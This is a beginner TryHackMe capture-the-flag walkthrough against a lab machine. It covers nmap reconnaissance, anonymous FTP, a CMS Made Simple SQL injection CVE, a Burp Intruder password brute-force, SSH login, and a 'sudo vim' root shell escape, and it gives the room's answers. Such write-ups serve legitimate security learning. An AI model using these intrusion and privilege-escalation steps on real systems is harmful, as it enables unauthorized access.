---
title: "[TryHackMe] Simple CTF - Walkthrough"
date: 2021-04-27T20:29:11+01:00
author: ascrivins
description: "A beginner level CTF."
ShowToc: true
ShowBreadCrumbs: true
ShowReadingTime: true
ShowPostNavLinks: true
ShowShareButtons: true
categories: ["TryHackMe"]
tags: ["Walkthrough", "nmap", "dirbuster", "ssh", "Privilege Escalation", "ftp", "Burp Suite"]
cover:
   image: "/post_images/SimpleCTF/banner.png"
---

# Intro

Link to Room: https://tryhackme.com/room/easyctf 

--------------

# Reconnaissance
## Nmap Scan
Starting with an nmap scan to see the open ports and running services. 

    └─$ nmap -sC -sV [ip]
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 19:10 BST
    Nmap scan report for [ip]
    Host is up (0.034s latency).
    Not shown: 997 filtered ports
    PORT     STATE SERVICE VERSION
    21/tcp   open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)    <----
    |_Can't get directory listing: TIMEOUT
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.8.113.148
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))     <----
    | http-robots.txt: 2 disallowed entries                   <----
    |_/ /openemr-5_0_1_3 
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cc:a9:23 (RSA)
    |   256 9b:d1:65:07:51:08:00:61:98:ed:95:ed:3a:e3:81:1c (ECDSA)
    |_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Plenty of things to check out here. 

### How many services are running under port 1000?
2 - FTP on 21, HTTP on 80.

### What is running on the higher port?
SSH - on port 2222.

----------------

## Anonymous FTP Login
The nmap scan told us that the ftp server has been misconfigured and allows anonymous login so let's see what we get out of that.

    └─$ ftp [ip]
    Connected to [ip].
    220 (vsFTPd 3.0.3)
    Name ([my-ip]): anonymous
    230 Login successful.
    Remote system type is UNIX.
    ftp> ls -al
    drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
    drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
    drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
    ftp> cd pub
    ftp> ls -al
    drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
    drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
    -rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
    ftp> get ForMitch.txt
    local: ForMitch.txt remote: ForMitch.txt
    200 PORT command successful. 
    226 Transfer complete.

So we are able to download ForMitch.txt. This is the contents of the file:

![For Mitch File](/post_images/SimpleCTF/formitch.png)

This gives us some useful clues for later, it is likely that there is a username of mitch.

-----------------

## Webpage 
The webpage is the default Apache2 homepage. 

![Apache2 Homepage](/post_images/SimpleCTF/apache2.png)

The nmap scan told us that there is a robots.txt file with 2 disallowed entries. 

![Robots](/post_images/SimpleCTF/robots.png)

This is further exposing information that we could use later on.

------------------

## Dribuster
We can find other files and directories on the system with dirbuster. 

![Dirbuster](/post_images/SimpleCTF/dirbuster.png)

This gives the /simple/ directory that looks like this:

![CMS Made Simple](/post_images/SimpleCTF/cms.png)

At the bottom of the page we see; "This site is powered by [CMS Made Simple](http://www.cmsmadesimple.org) version 2.2.8" - We should do some research to see if this is vulnerable. 

### What's the CVE you're using against the application?
CVE-2019-9053 - CMS Made Simple version 2.2.8

----------------------

# Exploitation 
Our research into CMS Made Simple tell us the exploit vulnerability. 

### To what kind of vulnerability is the application vulnerable? 
sqli - SQL Injection

-----------

## Admin Login and Burp Suite
On the /simple/ main page you can find the link to the admin login panel at /simple/admin/login.php.

![Admin Login](/post_images/SimpleCTF/adminlogin.png)

Firing up Burp Suite, we can perform the SQL injection using the Intruder module. 

1. Intercept the request to the server. 
2. Right-click -> Send to Intruder
3. Set position around the password field with username mitch.
4. Select best110.txt as the payload
5. Start Attack

![Burp Suite](/post_images/SimpleCTF/burp.png)

The password can be identified by it's results that differ from all other payloads. 

We can login to the site admin pages but there is nothing to find here.

### What's the password?
secret 

### Where can you login with the details obtained?
ssh - on port 2222.

-----------------------

## SSH Login
We can login with the detail through SSH on 2222. Remember the specify the port with the -p flag.

    └─$ ssh mitch@10.10.7.85 -p 2222  

### What's the user flag?
[redacted] - Under mitch in the home directory.

### Is there any other user in the home directory? What's its name?
sunbath

-------------------

# Privilege Escalation
## Sudo -l 
Running this command will tell us the command we can use to leverage our position. 

    $ sudo -l
    User mitch may run the following commands on Machine:
        (root) NOPASSWD: /usr/bin/vim


### What can you leverage to spawn a privileged shell?
vim

-----------------

## Exploit 
Consulting GTFOBins, the command to gain a root shell is:

    $ sudo vim -c ':!/bin/sh'
    
    # whoami
    root
    # 

### What's the root flag?
Navigating to the root directory, we can read the root flag.

    # cd /root
    # ls -al
    total 28
    drwx------  4 root root 4096 aug 17  2019 .
    drwxr-xr-x 23 root root 4096 aug 19  2019 ..
    -rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
    drwx------  2 root root 4096 aug 17  2019 .cache
    drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
    -rw-r--r--  1 root root  148 aug 17  2015 .profile
    -rw-r--r--  1 root root   24 aug 17  2019 root.txt
    # cat root.txt
    W[Redacted]e it!

------------